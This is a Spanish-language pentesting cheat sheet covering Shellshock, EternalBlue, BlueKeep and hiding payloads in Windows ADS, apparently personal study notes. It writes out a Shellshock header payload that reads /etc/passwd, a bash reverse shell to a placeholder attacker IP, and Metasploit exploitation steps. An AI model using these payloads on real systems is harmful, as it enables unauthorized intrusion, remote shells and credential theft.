# Vulnerabilidades

Propietario: Adrian Gisbert Cabello

# Linux

## Vulnerabilidades protocolo FTP

- Para ver los scripts de NMAP disponibles para identificar vulnerabilidades: `ls -al /usr/share/nmap/scripts/ | grep ftp-*`

## Shellshock (CVE-2015-6271-Shellshock) Vulnerability: Es una vulnerabilidad en Bash para obtener una shell

- Si encontramos un script o algún archivo .cgi en alguna web que active un script podemos abusar de el:
- Mediante un script en NMAP: `nmap -sV 192.168.X.X --script=http-shellshock --script-args ¨http-shellshock.uri=/RUTA_DEL_ARCHIVO¨` Podremos saber si es vulnerable
- Si es vulnerable, con burpsuite podemos capturar la petición del script, lo llevamos al repeater e inyectamos el siguiente código en el HTTP Header:
- `() { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’`
- Podemos poner el comando que queramos, es un RCE.
- Podemos obtener una reverse shell con netcat: `() { :; }; echo; echo; /bin/bash -c ‘bash -i>&/dev/tcp/IP.MÁQUINA.ATACANTE/1234 0>&1'`
- También podemos abusar de la vulnerabilidad Shellshock con metasploit: `search shellshock`
- Podemos usar dos módulos: `use auxiliary/scanner/http/apache_mod_cgi_bash_env` | `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
- El primero es un escaner que nos dice si es vulnerable, el segundo tenemos que especificar dos parámetros, RHOSTS y TARGETURI (/gettime.cgi)
- Le damos a `run` y obtendremos una sesión meterpreter

# Windows

## Eternalblue Windows SMB (445):

- Para ver si el equipo víctima es vulnerable a eternalblue podemos utilizar dos formas:
- NMAP: `nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.X.X`
- Metasploit: `search eternalblue`

## BlueKeep CVE-2019-0708 Windows RDP (3389):

- Se puede explotar en XP, Vista, Windows 7 y Windows Server 2008 R2
- Para explotarlo con metasploit:
    - `search BlueKeep`
    - `use 0` (para saber si la máquina es vulnerable)
    - `set RHOSTS`
    - `run`
    
    - `use 1` (para usar un RCE - Ejecución Remota de Comandos)
    - `set RHOSTS`
    - `show targets`
    - `set target 2` (usar el número del target que proceda a la máquina víctima)

## WinRM Windows (p5985-p5986)

Alternate Data Streams (ADS) - Windows: Esconder un payload en la metadata de un archivo

- Buscar en google como esconder payloads ADS